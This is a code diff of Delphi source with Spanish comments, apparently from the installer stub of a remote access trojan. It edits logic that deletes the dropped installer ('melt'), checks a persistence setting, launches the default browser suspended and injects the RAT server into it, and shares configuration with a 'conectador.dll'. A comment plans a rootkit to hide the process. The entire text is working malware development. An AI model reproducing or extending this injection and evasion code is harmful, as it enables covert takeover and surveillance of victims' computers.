@@ -16,7 +16,7 @@ var
   Browser      : string;
   Instalado    : boolean;
 begin
- CompartirConfig();    //compartimos la configuración
+ CompartirConfig();    //compartimos la configuración en memoria para que conectador.dll la lea
   if ParamStr(1) = '\melt' then   //Melt
   begin
     //borro el archivo de instalación, reintento 5 veces por si las moscas :)
@@ -39,21 +39,11 @@ begin
                    //Lo malo de esto es que al esperar salimos listados en la lista de procesos, en el futuro habria que agregar un pequeño rootkit
 
     PID := GetProcessID('explorer.exe');
-      if (PID = 0) then
-      begin       //No existe explorer.exe, Muy raro....
-        ShellExecute(0, 'open', PAnsiChar('explorer.exe'), PAnsiChar('explorer.exe'), nil, SW_SHOWNORMAL);
-        sleep(30000);
-        PID := GetProcessID('explorer.exe');
-      end;
-      
-    if PID = 0 then exitprocess(0);
-
-    if not Configuracion.bPersistencia then
-    begin //como no está activada la persistencia yo me tengo que encargar de inyectar el rat
+    
+    if (not Configuracion.bPersistencia) or (PID = 0) then
+    begin //como no está activada la persistencia o no esta ejecutandose explorer.exe yo me tengo que encargar de inyectar el rat
       ZeroMemory(@StartInfo, SizeOf(TStartupInfo));
       StartInfo.cb      := SizeOf(TStartupInfo);
-      startinfo.dwFlags := STARTF_USESHOWWINDOW; // use wShowWindow
-      startinfo.wShowWindow := SW_HIDE;
       CreateProcess(pchar(GetBrowser), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
       sleep(500); //le dejamos un rato...
       InjectarRAT('R', procInfo.dwProcessId);    //inyectamos el servidor en memoria, ademas se encarga de esperar a que el rat lea la configuración
@@ -61,25 +51,12 @@ begin
     end
     else
     begin
-      Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
-      '%WinDir%\', FindWindowsDir());
-    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
-      '%SysDir%\', FindSystemDir());
-    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
-      '%TempDir%\', FindTempDir());
-    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
-      '%RootDir%\', FindRootDir());
-    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
-      '%AppDir%\', GetSpecialFolderPath($001C));
-      
+    
       if lc(ParamStr(0)) = lc(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
-      begin
-        Instalado := true;
-      end
+        Instalado := true
       else
-      begin
         Instalado := false;
-      end;
+
       Browser := GetBrowser;
       if not fileexists(Browser) then //si no existe el archivo del navegador predeterminado salimos
         exitprocess(0);
